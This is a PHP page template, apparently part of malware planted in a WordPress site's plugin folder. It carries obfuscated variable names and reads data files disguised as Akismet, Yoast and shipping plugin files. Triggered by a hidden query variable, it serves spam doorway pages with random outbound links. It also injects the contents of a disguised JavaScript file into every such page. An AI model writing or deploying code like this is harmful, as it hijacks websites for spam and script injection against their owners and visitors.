<?php
$mKTcS5FB = intval(get_query_var('rlksmbcbv'));

if ($mKTcS5FB < 1 || $mKTcS5FB > 3331) return;
$rDgWK7mAvp = file(plugin_dir_path(__FILE__).'kit-akismet.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$re6lW9Dkv = explode(';', $rDgWK7mAvp[$mKTcS5FB]);
if (count($re6lW9Dkv) < 2) return;
$vrIrl7S1G = $re6lW9Dkv[0];
$l23W3o  = $re6lW9Dkv[1];
$hybfUS5j = $re6lW9Dkv[2];
$t9gH5e  = $re6lW9Dkv[3];
$ofpiK7Wtu = $re6lW9Dkv[4];
set_query_var('wyqxikuk', $vrIrl7S1G);

$y4QahUvA = '';
$osh3Vi = plugin_dir_path(__FILE__).'shipping-excerpt.php';
if (is_file($osh3Vi)) {
	$kcU6xcQg = file($osh3Vi, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($kcU6xcQg);
	shuffle($kcU6xcQg);
	$laga4pz = mt_rand(2, 5);
	if (count($kcU6xcQg) > $laga4pz) {
		for ($tLVDXbonF = 0; $tLVDXbonF < $laga4pz; $tLVDXbonF++) {
			$vWsYx = array_shift($kcU6xcQg);
			$y4QahUvA .= '<p><a href="'.$vWsYx.'">'.$vWsYx.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $vrIrl7S1G; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $l23W3o . "</p>\n";
				if (strlen($t9gH5e) > 0) echo "<p>" . $t9gH5e . "</p>\n";
				if (strlen($hybfUS5j) > 0) echo "<p>" . $hybfUS5j . "</p>\n";
				if (strlen($ofpiK7Wtu) > 0) echo '<p><a href="#"><img src="'.$ofpiK7Wtu.'"></a>' . "</p>\n";
				echo $y4QahUvA;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$subtGgf = plugin_dir_path(__FILE__) . 'read-yoast.js';
if (is_file($subtGgf)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($subtGgf);
	echo '</script>';
}
get_footer();
?>
